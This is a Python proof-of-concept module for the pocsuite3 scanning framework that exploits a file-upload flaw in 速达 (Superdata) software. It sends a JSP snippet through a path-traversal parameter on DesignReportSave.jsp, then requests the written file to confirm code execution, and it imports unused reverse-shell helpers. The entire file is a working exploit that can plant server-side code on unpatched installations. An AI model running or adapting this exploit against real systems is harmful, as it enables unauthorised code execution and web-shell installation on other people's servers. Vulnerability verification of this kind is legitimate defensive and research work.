# _*_ coding:utf-8 _*_
# @Time : 2023/12/7
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class superdata_upload(POCBase):
    pocDesc = '''速达软件文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-07'
    name = '速达软件文件上传漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/report/DesignReportSave.jsp?report=../test.jsp'
        check_path = self.url+ "/test.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            "Content-Type": "application/octet-stream"
        }
        path = "/report/DesignReportSave.jsp?report=../test.jsp"
        try:
            data = '<% out.print("kkttxx");%>'

            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200:
                check_response = requests.get(check_path, headers=headers, verify=False)
                if check_response.status_code == 200 and 'kkttxx' in check_response.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['path'] = path

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(superdata_upload)